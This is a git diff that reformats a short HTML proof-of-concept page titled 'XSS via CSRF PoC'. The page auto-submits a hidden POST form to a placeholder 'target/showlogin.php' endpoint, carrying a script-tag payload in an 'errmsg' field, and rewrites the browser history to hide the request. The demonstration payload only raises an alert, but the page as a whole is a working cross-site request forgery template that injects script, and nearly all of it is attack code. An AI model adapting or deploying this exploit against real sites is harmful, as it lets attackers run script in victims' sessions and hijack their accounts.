@@ -1,22 +1,24 @@
 <!DOCTYPE html>
 <html>
+
 <head>
     <title>MY POC</title>
 </head>
-<body>
-      <h3>XSS via CSRF PoC by t0m1irv4n</h3>
-      <button id="exploitBtn">Klik untuk Eksploitasi</button>
-      <div id="status"></div>
 
-<form action="https://target/showlogin.php" method="POST">
+<body>
+    <h3>XSS via CSRF PoC by t0m1irv4n</h3>
+    <button id="exploitBtn">Klik untuk Eksploitasi</button>
+    <div id="status"></div>
+
+    <form action="https://target/showlogin.php" method="POST">
         <input type="hidden" name="errmsg" value="<script>alert(1)</script>">
         <input type="submit">
-    <script>
-          history.pushState('', '', '/');
-          document.forms[0].submit();
-      </script>
-    
-</form>
-  </body>
-</html>
+        <script>
+            history.pushState('', '', '/');
+              document.forms[0].submit();
+        </script>
 
+    </form>
+</body>
+
+</html>
